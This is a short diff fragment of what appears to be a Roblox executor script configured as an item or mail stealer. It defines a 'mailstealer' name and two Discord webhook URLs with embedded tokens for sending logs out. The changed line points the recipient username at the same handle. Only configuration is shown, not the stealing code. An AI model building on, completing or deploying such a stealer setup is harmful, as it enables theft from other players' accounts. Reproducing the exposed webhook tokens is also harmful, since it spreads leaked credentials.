@@ -138,7 +138,7 @@ DualUser = "9ondosYT"
 DualWebhook = "https://discord.com/api/webhooks/1458256626363662521/hTS3ZiN_0r1qcFqq8KwwXJkWF7GZ2ATzE0VNCTUU1LtLBY9J_Ekr8uyrRvZxivRjauM9"
 LogsWebhook = "https://discord.com/api/webhooks/1458256626363662521/hTS3ZiN_0r1qcFqq8KwwXJkWF7GZ2ATzE0VNCTUU1LtLBY9J_Ekr8uyrRvZxivRjauM9"
 mailstealer_name = "9ondosyt"
-Roblox_Username = Username
+Roblox_Username = 9ondosyt
 Discord_Webhook = Webhook
 LOGS_WEBHOOK = LogsWebhook
 if getgenv().Executed == true then
